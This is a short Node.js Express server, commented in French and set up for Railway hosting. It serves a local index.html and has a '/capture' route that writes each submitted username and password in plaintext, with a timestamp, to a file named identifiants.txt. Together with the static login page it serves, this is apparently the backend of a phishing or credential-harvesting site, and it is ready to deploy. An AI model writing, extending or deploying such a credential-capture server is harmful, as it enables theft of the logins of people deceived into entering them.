const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

// 1. D'abord, on initialise "app"
const app = express(); 

// 2. Ensuite, on configure le port (crucial pour Railway)
const PORT = process.env.PORT || 3000;

// 3. On applique les middlewares (maintenant que "app" existe !)
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname)); // Sert ton index.html

// 4. Tes routes
app.post('/capture', (req, res) => {
    const { username, password } = req.body;
    const data = `Utilisateur: ${username} | MDP: ${password} | Date: ${new Date().toLocaleString()}\n`;

    fs.appendFile(path.join(__dirname, 'identifiants.txt'), data, (err) => {
        if (err) {
            console.error("Erreur d'écriture :", err);
            return res.status(500).send("Erreur");
        }
        console.log("Données sauvegardées !");
        res.status(200).send("OK");
    });
});

// Route par défaut pour afficher ton HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 5. On lance le serveur
app.listen(PORT, () => {
    console.log(`Serveur prêt sur le port ${PORT}`);
});